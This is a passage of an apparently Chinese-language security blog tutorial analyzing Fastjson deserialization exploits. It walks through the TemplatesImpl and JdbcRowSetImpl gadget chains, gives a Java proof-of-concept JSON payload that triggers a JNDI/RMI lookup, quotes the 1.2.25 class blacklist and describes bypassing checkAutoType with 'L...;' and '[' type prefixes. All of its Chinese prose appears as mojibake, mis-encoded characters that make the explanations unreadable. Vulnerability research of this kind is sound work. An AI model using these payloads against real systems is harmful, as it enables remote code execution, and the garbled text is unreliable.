<li>è¿™é‡Œåˆ©ç”¨äº†ä¸€ä¸ª<code>Feature.SupportNonPublicField</code>ï¼Œè¿™ä¸ªèµ·åˆ°äº†ä»€ä¹ˆä½œç”¨ï¼Œæˆ‘ä»¬åœ¨è·å–æ–¹æ³•æ—¶ï¼Œæ¯”å¦‚setterï¼Œå…¶å®setteråŸºæœ¬éƒ½æ˜¯privateç±»å‹çš„å˜é‡ï¼Œè¿™é‡Œè®¾ç½®è¿™ä¸ªå°±æ˜¯ä¸ºäº†ç”¨æ¥ç»™ç§æœ‰å˜é‡è¿›è¡Œèµ‹å€¼çš„ã€‚</li>
</ul>
<p>è¿™ä¸ªç®—æ˜¯æ¯”è¾ƒè€ç‰ˆæœ¬çš„äº†ï¼Œå¯ä»¥è°ƒè¯•è·Ÿä¸€ä¸‹ï¼Œè¿™ç±»çš„è¿‡ç¨‹å°±å’Œå‰é¢åˆ†æçš„parseObject()è¿‡ç¨‹æ˜¯ä¸ä¸€æ ·äº†çš„ï¼Œæˆ‘ä»¬è¿™é‡Œè¿˜éœ€è¦ä¼ å…¥å¦å¤–ä¸€ä¸ªFeature.SupportNonPublicFieldï¼Œå…¶å®æ˜¯å¹¶æ²¡æœ‰è°ƒç”¨toJSONçš„ï¼š</p>
<p><img src="https://fpc-mybucket.oss-cn-beijing.aliyuncs.com/images/image-20250411184310920.png"
	
	
	
	loading="lazy"
	
		alt="image-20250411184310920"
	
	
></p>
<p>ä¹Ÿå°±å’Œå‰é¢åˆ†æçš„è¿‡ç¨‹ä¸ä¸€æ ·äº†ï¼Œæ‰€ä»¥çœŸæ­£è°ƒç”¨getterçš„åœ°æ–¹å¹¶ä¸æ˜¯å‰é¢åˆ†æçš„toJSON()æ–¹æ³•çš„åºåˆ—åŒ–ï¼Œè€Œæ˜¯å¦å¤–çš„åœ°æ–¹ï¼ŒåŸºæœ¬è¿‡ç¨‹åœ¨å‰é¢è¡¥å……è¯´æ˜ä¸­ï¼Œç°åœ¨æ¥çœ‹çœ‹ä¸ºä»€ä¹ˆè¿™ä¸ª<code>_outputProperties</code>å˜é‡ç¬¦åˆé‚£å‡ ä¸ªæ¡ä»¶ï¼š
å˜é‡çš„getteræ–¹æ³•å¦‚ä¸‹ï¼š</p>
<p><img src="https://fpc-mybucket.oss-cn-beijing.aliyuncs.com/images/image-20250411221326498.png"
	
	
	
	loading="lazy"
	
		alt="image-20250411221326498"
	
	
></p>
<p>è¿”å›ç±»å‹ä¸ºProperties.classï¼Œå…¶çˆ¶ç±»ä¸ºHashtableï¼Œè€ŒHashtableå®ç°äº†Mapæ¥å£ï¼Œç„¶åè¿™ä¸ªç±»æ²¡æœ‰setteræ–¹æ³•ï¼Œä¸æ˜¯é™æ€æ–¹æ³•ï¼Œé•¿åº¦å¤§äº4ï¼Œå®Œç¾ç¬¦åˆï¼Œè¿™ä¹Ÿå°±æ˜¯ä¸ºä»€ä¹ˆåœ¨ååºåˆ—åŒ–çš„æ—¶å€™è°ƒç”¨åˆ°äº†getteræ–¹æ³•ä»è€Œå®ç°äº†ä¸€æ¬¡è°ƒç”¨é“¾çš„æ‰§è¡Œã€‚</p>
<h4 id="jdbcrowsetimplé“¾">JdbcRowSetImplé“¾
</h4><p>è¿™é‡Œåˆ©ç”¨åˆ°çš„ç±»æ˜¯jdbcRowSetImplç±»ï¼Œè¿™ä¸ªç±»ä½äº<code>com.sun.rowset.JdbcRowSetImpl</code>ï¼Œç®€å•çœ‹äº†ä¸€ä¸‹è¿™ä¸ªç±»ï¼Œå¯ä»¥çœ‹åˆ°ä¸€ä¸ªå¯ä»¥è§¦å‘jndiæ³¨å…¥çš„æ–¹æ³•ï¼š</p>
<p><img src="https://fpc-mybucket.oss-cn-beijing.aliyuncs.com/images/image-20250412130255222.png"
	
	
	
	loading="lazy"
	
		alt="image-20250412130255222"
	
	
></p>
<p>çœ‹ä¸€ä¸‹è¿™é‡Œæœ‰æ— è°ƒç”¨connect()æ–¹æ³•çš„ä»£ç ï¼Œæ‰¾åˆ°äº†ä¸€ä¸ªgetterï¼š</p>
<p><img src="https://fpc-mybucket.oss-cn-beijing.aliyuncs.com/images/image-20250412130526131.png"
	
	
	
	loading="lazy"
	
		alt="image-20250412130526131"
	
	
></p>
<p>å’Œä¸€ä¸ªsetterï¼š</p>
<p><img src="https://fpc-mybucket.oss-cn-beijing.aliyuncs.com/images/image-20250412130545784.png"
	
	
	
	loading="lazy"
	
		alt="image-20250412130545784"
	
	
></p>
<p>å¯¹äºè¿™ä¸ªgetterï¼Œå¯ä»¥æƒ³ä¸€ä¸‹æ˜¯å¦å¯ä»¥åœ¨ååºåˆ—åŒ–çš„æ—¶å€™è°ƒç”¨ï¼Œå¯¹åº”å˜é‡æ— setteræ–¹æ³•ï¼Œè¿”å›å±æ€§ä¸ºDatabaseMetaDataï¼Œä¸æ»¡è¶³é‚£å‡ ä¸ªå±æ€§ä¹‹ä¸€ï¼Œåªèƒ½æ”¾å¼ƒã€‚é‚£ä¹ˆç°åœ¨ç€é‡çœ‹setteræ–¹æ³•ï¼š</p>
<p><img src="https://fpc-mybucket.oss-cn-beijing.aliyuncs.com/images/image-20250412161931619.png"
	
	
	
	loading="lazy"
	
		alt="image-20250412161931619"
	
	
></p>
<p>éœ€è¦connä¸ºnullï¼Œè€Œåœ¨å‰é¢çš„å­¦ä¹ ä¸­ï¼Œå¯ä»¥çŸ¥é“å®ä¾‹åŒ–ç±»æ—¶æ˜¯è°ƒç”¨çš„<code>newInstance()</code>ï¼Œä¹Ÿå°±æ˜¯ä¼šè°ƒç”¨é»˜è®¤çš„æ„é€ æ–¹æ³•ï¼Œå¯ä»¥çœ‹ä¸€ä¸‹è¿™é‡Œçš„é»˜è®¤çš„æ„é€ æ–¹æ³•ï¼š</p>
<p><img src="https://fpc-mybucket.oss-cn-beijing.aliyuncs.com/images/image-20250412162040971.png"
	
	
	
	loading="lazy"
	
		alt="image-20250412162040971"
	
	
></p>
<p>ä¼šå°†connè®¾ç½®ä¸ºnullï¼Œç„¶åå†è·Ÿè¿›connect()æ–¹æ³•éœ€è¦çš„å‚æ•°ï¼š</p>
<p><img src="https://fpc-mybucket.oss-cn-beijing.aliyuncs.com/images/image-20250412162130197.png"
	
	
	
	loading="lazy"
	
		alt="image-20250412162130197"
	
	
></p>
<p>ä¸»è¦å°±æ˜¯è¿™ä¸ªgetDataSourceName()æ–¹æ³•ï¼Œè·Ÿè¿›å‘ç°æ˜¯è¿”å›çš„çˆ¶ç±»BaseRowSetçš„ä¸€ä¸ªå˜é‡ï¼š</p>
<p><img src="https://fpc-mybucket.oss-cn-beijing.aliyuncs.com/images/image-20250412162202091.png"
	
	
	
	loading="lazy"
	
		alt="image-20250412162202091"
	
	
></p>
<p>è¿˜æ˜¯ç›´æ¥èµ‹å€¼å³å¯ï¼Œçˆ¶ç±»å­˜åœ¨setteræ–¹æ³•æ¥è¿›è¡Œèµ‹å€¼ï¼š</p>
<p><img src="https://fpc-mybucket.oss-cn-beijing.aliyuncs.com/images/image-20250412163054996.png"
	
	
	
	loading="lazy"
	
		alt="image-20250412163054996"
	
	
></p>
<p>é‚£ä¹ˆå°±å¯ä»¥å°è¯•æ‰“ä¸€ä¸ªjndiäº†ï¼ˆæ³¨æ„javaçš„ç‰ˆæœ¬ï¼‰ï¼š</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-java" data-lang="java"><span class="line"><span class="cl"><span class="kn">package</span><span class="w"> </span><span class="nn">fastjson</span><span class="p">;</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="kn">import</span><span class="w"> </span><span class="nn">com.alibaba.fastjson.JSON</span><span class="p">;</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="kn">import</span><span class="w"> </span><span class="nn">com.alibaba.fastjson.JSONObject</span><span class="p">;</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="kd">public</span><span class="w"> </span><span class="kd">class</span> <span class="nc">Fastjson_Test</span><span class="p">{</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="kd">public</span><span class="w"> </span><span class="kd">static</span><span class="w"> </span><span class="kt">void</span><span class="w"> </span><span class="nf">main</span><span class="p">(</span><span class="n">String</span><span class="o">[]</span><span class="w"> </span><span class="n">args</span><span class="p">)</span><span class="w"> </span><span class="p">{</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">String</span><span class="w"> </span><span class="n">json</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="s">&#34;{\&#34;@type\&#34;:\&#34;com.sun.rowset.JdbcRowSetImpl\&#34;,\&#34;dataSourceName\&#34;:\&#34;rmi://127.0.0.1:1099/Hello\&#34;,\&#34;autoCommit\&#34;:\&#34;true\&#34;}&#34;</span><span class="p">;</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">JSONObject</span><span class="w"> </span><span class="n">obj</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">JSON</span><span class="p">.</span><span class="na">parseObject</span><span class="p">(</span><span class="n">json</span><span class="p">);</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="p">}</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="p">}</span><span class="w">
</span></span></span></code></pre></td></tr></table>
</div>
</div><p>æˆ‘è¿™é‡Œæ˜¯å°è¯•çš„æ‰“rmiï¼ŒåŸºæœ¬æµç¨‹å°±å’Œjndiæ‰“rmiä¸€æ ·çš„ï¼Œæœ€åæˆåŠŸå¼¹å‡ºè®¡ç®—æœºã€‚</p>
<h3 id="1225fastjson1241">1.2.25&lt;=fastjson&lt;=1.2.41
</h3><p>åœ¨è¿™ä¸ªç‰ˆæœ¬ä¸‹ï¼ŒåŠ äº†é»‘ç™½åå•ï¼Œå…·ä½“ä»¥ç¬¬ä¸€ä¸ªç‰ˆæœ¬ï¼Œåé¢å‡ ä¸ªéƒ½æ˜¯ç»•è¿‡ã€‚</p>
<p>pomä¾èµ–æ”¹æˆï¼š</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span><span class="lnt">4
</span><span class="lnt">5
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-xml" data-lang="xml"><span class="line"><span class="cl"><span class="nt">&lt;dependency&gt;</span>
</span></span><span class="line"><span class="cl">      <span class="nt">&lt;groupId&gt;</span>com.alibaba<span class="nt">&lt;/groupId&gt;</span>
</span></span><span class="line"><span class="cl">      <span class="nt">&lt;artifactId&gt;</span>fastjson<span class="nt">&lt;/artifactId&gt;</span>
</span></span><span class="line"><span class="cl">      <span class="nt">&lt;version&gt;</span>1.2.25<span class="nt">&lt;/version&gt;</span>
</span></span><span class="line"><span class="cl">    <span class="nt">&lt;/dependency&gt;</span>
</span></span></code></pre></td></tr></table>
</div>
</div><p>å…¶å®å°±æ˜¯æ”¹ä¸€ä¸‹ç‰ˆæœ¬å³å¯ã€‚</p>
<p>å¯ä»¥çœ‹åˆ°åŠ äº†çš„é»‘åå•ï¼š</p>
<p><img src="https://fpc-mybucket.oss-cn-beijing.aliyuncs.com/images/image-20250412170058841.png"
	
	
	
	loading="lazy"
	
		alt="image-20250412170058841"
	
	
></p>
<p>å…·ä½“çš„é»‘åå•å¦‚ä¸‹ï¼š</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span><span class="lnt">15
</span><span class="lnt">16
</span><span class="lnt">17
</span><span class="lnt">18
</span><span class="lnt">19
</span><span class="lnt">20
</span><span class="lnt">21
</span><span class="lnt">22
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-java" data-lang="java"><span class="line"><span class="cl"><span class="n">bsh</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="n">com</span><span class="p">.</span><span class="na">mchange</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="n">com</span><span class="p">.</span><span class="na">sun</span><span class="p">.</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="n">java</span><span class="p">.</span><span class="na">lang</span><span class="p">.</span><span class="na">Thread</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="n">java</span><span class="p">.</span><span class="na">net</span><span class="p">.</span><span class="na">Socket</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="n">java</span><span class="p">.</span><span class="na">rmi</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="n">javax</span><span class="p">.</span><span class="na">xml</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="n">org</span><span class="p">.</span><span class="na">apache</span><span class="p">.</span><span class="na">bcel</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="n">org</span><span class="p">.</span><span class="na">apache</span><span class="p">.</span><span class="na">commons</span><span class="p">.</span><span class="na">beanutils</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="n">org</span><span class="p">.</span><span class="na">apache</span><span class="p">.</span><span class="na">commons</span><span class="p">.</span><span class="na">collections</span><span class="p">.</span><span class="na">Transformer</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="n">org</span><span class="p">.</span><span class="na">apache</span><span class="p">.</span><span class="na">commons</span><span class="p">.</span><span class="na">collections</span><span class="p">.</span><span class="na">functors</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="n">org</span><span class="p">.</span><span class="na">apache</span><span class="p">.</span><span class="na">commons</span><span class="p">.</span><span class="na">collections4</span><span class="p">.</span><span class="na">comparators</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="n">org</span><span class="p">.</span><span class="na">apache</span><span class="p">.</span><span class="na">commons</span><span class="p">.</span><span class="na">fileupload</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="n">org</span><span class="p">.</span><span class="na">apache</span><span class="p">.</span><span class="na">myfaces</span><span class="p">.</span><span class="na">context</span><span class="p">.</span><span class="na">servlet</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="n">org</span><span class="p">.</span><span class="na">apache</span><span class="p">.</span><span class="na">tomcat</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="n">org</span><span class="p">.</span><span class="na">apache</span><span class="p">.</span><span class="na">wicket</span><span class="p">.</span><span class="na">util</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="n">org</span><span class="p">.</span><span class="na">codehaus</span><span class="p">.</span><span class="na">groovy</span><span class="p">.</span><span class="na">runtime</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="n">org</span><span class="p">.</span><span class="na">hibernate</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="n">org</span><span class="p">.</span><span class="na">jboss</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="n">org</span><span class="p">.</span><span class="na">mozilla</span><span class="p">.</span><span class="na">javascript</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="n">org</span><span class="p">.</span><span class="na">python</span><span class="p">.</span><span class="na">core</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="n">org</span><span class="p">.</span><span class="na">springframework</span><span class="w">
</span></span></span></code></pre></td></tr></table>
</div>
</div><p>æŠŠcom.sunåŒ…ä¸‹çš„ç±»éƒ½ç¦äº†ï¼Œå¯¼è‡´å‰é¢çš„ä¸¤æ¡é“¾å­éƒ½æ‰“ä¸äº†äº†ã€‚</p>
<p>è¿™é‡Œå†æ¥ç®€å•çœ‹ä¸€ä¸‹è°ƒç”¨é“¾è¿‡ç¨‹ï¼Œè¿˜æ˜¯ç”¨å‰é¢çš„æ‰“jndiæ³¨å…¥çš„åœ°æ–¹æ¥è°ƒè¯•ï¼Œä¸»è¦çš„ä¸åŒåœ¨äºå¦‚ä¸‹ä»£ç ï¼š</p>
<p><img src="https://fpc-mybucket.oss-cn-beijing.aliyuncs.com/images/image-20250412171234410.png"
	
	
	
	loading="lazy"
	
		alt="image-20250412171234410"
	
	
></p>
<p>åŸæœ¬æˆ‘ä»¬æ˜¯ç›´æ¥è°ƒç”¨loadClass()æ–¹æ³•æ¥åŠ è½½ç±»ï¼Œè¿™é‡ŒåŠ äº†ä¸€ä¸ªæ£€æµ‹ï¼Œè·Ÿè¿›è¿™é‡Œçš„checkAutoType()æ–¹æ³•ï¼š</p>
<p><img src="https://fpc-mybucket.oss-cn-beijing.aliyuncs.com/images/image-20250412172108550.png"
	
	
	
	loading="lazy"
	
		alt="image-20250412172108550"
	
	
></p>
<p>è°ƒç”¨æ ˆä¸ºï¼š</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span><span class="lnt">4
</span><span class="lnt">5
</span><span class="lnt">6
</span><span class="lnt">7
</span><span class="lnt">8
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">checkAutoType:844, ParserConfig (com.alibaba.fastjson.parser)
</span></span><span class="line"><span class="cl">parseObject:322, DefaultJSONParser (com.alibaba.fastjson.parser)
</span></span><span class="line"><span class="cl">parse:1327, DefaultJSONParser (com.alibaba.fastjson.parser)
</span></span><span class="line"><span class="cl">parse:1293, DefaultJSONParser (com.alibaba.fastjson.parser)
</span></span><span class="line"><span class="cl">parse:137, JSON (com.alibaba.fastjson)
</span></span><span class="line"><span class="cl">parse:128, JSON (com.alibaba.fastjson)
</span></span><span class="line"><span class="cl">parseObject:201, JSON (com.alibaba.fastjson)
</span></span><span class="line"><span class="cl">main:10, Fastjson_Test (fastjson)
</span></span></code></pre></td></tr></table>
</div>
</div><p>å†çœ‹ä¸Šå›¾ï¼ŒautoTypeSupporté»˜è®¤æ˜¯falseï¼Œè¿™é‡Œå¦‚æœæƒ³è¦è°ƒç”¨åˆ°loadClass()æ–¹æ³•ï¼Œé™¤äº†ä¸åŒ¹é…åˆ°é»‘åå•ï¼Œè¿˜éœ€è¦åŒ¹é…åˆ°ç™½åå•ï¼Œä½†æ˜¯è¿™é‡Œçš„ç™½åå•åˆæ˜¯ç©ºï¼š
<img src="https://fpc-mybucket.oss-cn-beijing.aliyuncs.com/images/image-20250412172335592.png"
	
	
	
	loading="lazy"
	
		alt="image-20250412172335592"
	
	
></p>
<p>å¦‚æœä¸è¿›è¡Œå¤„ç†çš„è¯å°±ä¸å¯èƒ½å¯ä»¥è°ƒç”¨åˆ°loadClass()æ–¹æ³•ã€‚ä½†æ˜¯åœ¨è¿™ä¸ªæ–¹æ³•çš„å¤„ç†ä¸­ï¼Œå¯ä»¥çœ‹åˆ°æœ‰ä¸‰ä¸ªåœ°æ–¹éƒ½æœ‰è°ƒç”¨TypeUtils.loadClass()ï¼Œé™¤äº†ä¸Šé¢è¿™ä¸ªï¼Œé¡ºåºåˆ†åˆ«ä¸ºï¼š</p>
<p><img src="https://fpc-mybucket.oss-cn-beijing.aliyuncs.com/images/image-20250412172657192.png"
	
	
	
	loading="lazy"
	
		alt="image-20250412172657192"
	
	
></p>
<p><img src="https://fpc-mybucket.oss-cn-beijing.aliyuncs.com/images/image-20250412172108550.png"
	
	
	
	loading="lazy"
	
		alt="image-20250412172108550"
	
	
></p>
<p>ä»¥åŠï¼š</p>
<p><img src="https://fpc-mybucket.oss-cn-beijing.aliyuncs.com/images/image-20250412172719199.png"
	
	
	
	loading="lazy"
	
		alt="image-20250412172719199"
	
	
></p>
<p>åœ¨æœ€åä¸€ä¸ªå›¾ç‰‡ï¼Œå¯ä»¥çœ‹åˆ°è¿™é‡Œçš„è°ƒç”¨éƒ½æ˜¯å’ŒautoTypeSupportå˜é‡ç›¸å…³çš„ï¼Œè¿™é‡Œçš„expectClasså˜é‡æ˜¯å½¢å‚ä¼ é€’çš„ï¼Œè‚¯å®šä¸ºnullï¼Œé‚£ä¹ˆè¿™é‡Œåªè¦å¯ä»¥å°è¯•æ§åˆ¶autoTypeSupportä¸ºtrueï¼Œå¹¶ä¸”ä¸è§¦å‘é»‘åå•ï¼Œç™½åå•ä¸ç”¨ç®¡ï¼Œåæ­£ç™½åå•æ˜¯ä¸ä¼šè§¦å‘çš„ï¼Œæœ¬æ¥å°±æ˜¯ä¸€ä¸ªç©ºçš„ã€‚é‚£ä¹ˆå°±å¯ä»¥å°è¯•åœ¨è¿™é‡Œè¿›è¡Œä¸€æ¬¡åŠ è½½ç±»ã€‚</p>
<p>é»‘åå•æ€ä¹ˆè§£å†³ï¼Œå½“æ—¶å¯ä»¥å°è¯•ä½¿ç”¨é»‘åå•ä¹‹å¤–çš„ç±»ï¼Œè¿˜æœ‰å¦å¤–çš„è§£æ³•ï¼Œè·Ÿè¿›TypeUtils.loadClass()æ–¹æ³•ï¼Œæœ‰ä¸€ä¸ªåˆ©ç”¨ç‚¹ï¼š</p>
<p><img src="https://fpc-mybucket.oss-cn-beijing.aliyuncs.com/images/image-20250412174956868.png"
	
	
	
	loading="lazy"
	
		alt="image-20250412174956868"
	
	
></p>
<p>æœ€å¼€å§‹æˆ‘ä»¬æ˜¯ç›´æ¥è¿›è¡Œæœ€ä¸‹é¢æ–¹æ³•çš„è°ƒç”¨ï¼Œç„¶åç›´æ¥è¿”å›åŠ è½½çš„ç±»ï¼Œç°åœ¨çœ‹æˆ‘ä»¬è¿™é‡Œæ ‡æ³¨å‡ºæ¥çš„ä¸¤ä¸ªä»£ç å—ï¼š</p>
<ul>
<li>
<p>å¯¹äºç¬¬ä¸€ä¸ªï¼Œå¦‚æœä»¥<code>[</code>å¼€å¤´ï¼Œå°±æ˜¯<code>@type</code>é”®çš„å€¼ä»¥<code>[</code>å¼€å¤´ï¼Œå°±ä½¿ç”¨substringæ–¹æ³•æ¥æˆªæ–­è·å–<code>[</code>åé¢çš„æ–¹æ³•ï¼Œç„¶åå†æ¬¡è°ƒç”¨loadClass()æ–¹æ³•æ¥åŠ è½½ï¼Œä½†æ˜¯ä¼šä¹‹ç±»æœ€åæ˜¯æ”¾è¿›äº†ä¸€ä¸ªæ•°ç»„ï¼Œåé¢è¿˜éœ€è¦è¿›è¡Œå¤„ç†ã€‚</p>
</li>
<li>
<p>å¯¹äºç¬¬äºŒä¸ªï¼Œå¦‚æœå¯¹åº”å€¼ä»¥<code>L</code>å¼€å¤´å¹¶ä¸”ä»¥<code>;</code>ç»“å°¾ï¼Œé‚£ä¹ˆåŒæ ·æˆªå–ä¸­é—´çš„å†…å®¹ï¼Œç„¶åå†æ¬¡è°ƒç”¨loadClass()æ–¹æ³•æ¥åŠ è½½ï¼Œè¿™ä¸ªå°±æ¯”è¾ƒå¥½ç”¨äº†ï¼Œæ˜¯ç›´æ¥è¿”å›çš„loadClass()å¤„ç†å®Œçš„æ•°æ®ï¼Œä¸ç”¨åœ¨åé¢çš„ä»£ç è¿›è¡Œå¤„ç†ã€‚</p>
</li>
</ul>
<p>è¿™é‡Œæˆ‘ä»¬å…ˆä»¥ç¬¬äºŒä¸ªä¸ºä¾‹æ¥å®Œæˆä¸€æ¬¡è°ƒç”¨ï¼Œå†æ¥åˆ†ææ„é€ ç¬¬ä¸€ä¸ªçš„payloadã€‚åœ¨å‰é¢çš„äº†è§£ä¸­ï¼Œæˆ‘ä»¬å¯ä»¥çŸ¥é“ç¦»ä¸å¼€çš„å˜é‡å°±æ˜¯autoTypeSupportï¼Œæˆ‘ä»¬éœ€è¦ä»–ä¸ºfalseï¼Œè·Ÿè¿›è¿™ä¸ªå˜é‡çš„èµ‹å€¼ï¼š</p>
<p><img src="https://fpc-mybucket.oss-cn-beijing.aliyuncs.com/images/image-20250412175749373.png"
	
	
	
	loading="lazy"
	
		alt="image-20250412175749373"
	
	
></p>
<p>å†çœ‹AUTO_SUPPORTå˜é‡çš„èµ‹å€¼ï¼Œé»˜è®¤æƒ…å†µä¸‹å°±æ˜¯å¦‚ä¸‹ä»£ç ï¼š</p>
<p><img src="https://fpc-mybucket.oss-cn-beijing.aliyuncs.com/images/image-20250412181516840.png"
	
	
	
	loading="lazy"
	
		alt="image-20250412181516840"
	
	
></p>
<p>çŸ¥é“è¿™é‡Œæœ€åä¸ºfalseå³å¯ï¼Œæ€ä¹ˆè®¾ç½®è¿™ä¸ªç±»çš„autoTypeSupportå˜é‡ï¼Œåœ¨è¿™ä¸ªç±»å…¶å®æ˜¯å­˜åœ¨ä¸€ä¸ªsetteræ–¹æ³•çš„ï¼Œç”¨äºç»™è¿™ä¸ªå˜é‡èµ‹å€¼ï¼š</p>
<p><img src="https://fpc-mybucket.oss-cn-beijing.aliyuncs.com/images/image-20250412181721989.png"
	
	
	
	loading="lazy"
	
		alt="image-20250412181721989"
	
	
></p>
<p>ä½†æ˜¯æˆ‘ä»¬å¹¶ä¸èƒ½ç›´æ¥åœ¨jsonæ•°æ®å­—ç¬¦ä¸²ä¸­èµ‹å€¼ï¼Œå› ä¸ºè¿™ä¸ªç±»ä¹Ÿæ˜¯ç›´æ¥ä»å½¢å‚ä¸Šå®šä¹‰çš„ï¼Œç®€å•æº¯æºå¦‚ä¸‹ï¼š</p>
<p><img src="https://fpc-mybucket.oss-cn-beijing.aliyuncs.com/images/image-20250412181847468.png"
	
	
	
	loading="lazy"
	
		alt="image-20250412181847468"
	
	
></p>
<p>è°ƒç”¨çš„configå˜é‡çš„è¿™ä¸ªæ–¹æ³•ï¼ˆä¹Ÿå°±æ˜¯ParserConfigç±»çš„checkAutoType()æ–¹æ³•ï¼‰ï¼Œå¹¶ä¸”å¯ä»¥çŸ¥é“æ˜¯DefaultJSONParserè¿™ä¸ªç±»çš„configå˜é‡ï¼Œä¹Ÿæ˜¯è°ƒè¯•åˆ†ææ—¶ç»å¸¸å‡ºç°çš„ï¼Œæº¯åˆ°DefaultJSONParserç±»çš„å®ä¾‹åŒ–ï¼š</p>
<p><img src="https://fpc-mybucket.oss-cn-beijing.aliyuncs.com/images/image-20250412182154573.png"
	
	
	
	loading="lazy"
	
		alt="image-20250412182154573"
	
	
></p>
<p>å¯¹åº”å†…å®¹ä¸ºï¼š</p>
<p><img src="https://fpc-mybucket.oss-cn-beijing.aliyuncs.com/images/image-20250412182544145.png"
	
	
	
	loading="lazy"
	
		alt="image-20250412182544145"
	
	
></p>
<p>å½¢å‚ä¼ é€’å°±ä¸å¤šè¯´äº†ï¼Œè·Ÿä¸€ä¸‹å°±çŸ¥é“äº†ï¼Œæ‰€ä»¥configçš„èµ‹å€¼å°±æ˜¯è¿™ä¸ªï¼Œä»ä¸­å¯ä»¥çœ‹å‡ºè¿™é‡Œå°±æ˜¯å®ä¾‹åŒ–äº†ä¸€ä¸ªParserConfigç±»ï¼Œå˜é‡éƒ½æ˜¯é»˜è®¤çš„ï¼Œæ‰€ä»¥åœ¨jsonå­—ç¬¦ä¸²å¯¹æ˜¯ä¸å¯æ§çš„ï¼Œæ‰€ä»¥å…¶å®æœ‰ä¸€å®šçš„å±€é™æ€§çš„ï¼Œæœ€åçš„POCå¦‚ä¸‹ï¼š</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-java" data-lang="java"><span class="line"><span class="cl"><span class="kn">package</span><span class="w"> </span><span class="nn">fastjson</span><span class="p">;</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="kn">import</span><span class="w"> </span><span class="nn">com.alibaba.fastjson.JSON</span><span class="p">;</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="kn">import</span><span class="w"> </span><span class="nn">com.alibaba.fastjson.JSONObject</span><span class="p">;</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="kn">import</span><span class="w"> </span><span class="nn">com.alibaba.fastjson.parser.ParserConfig</span><span class="p">;</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">
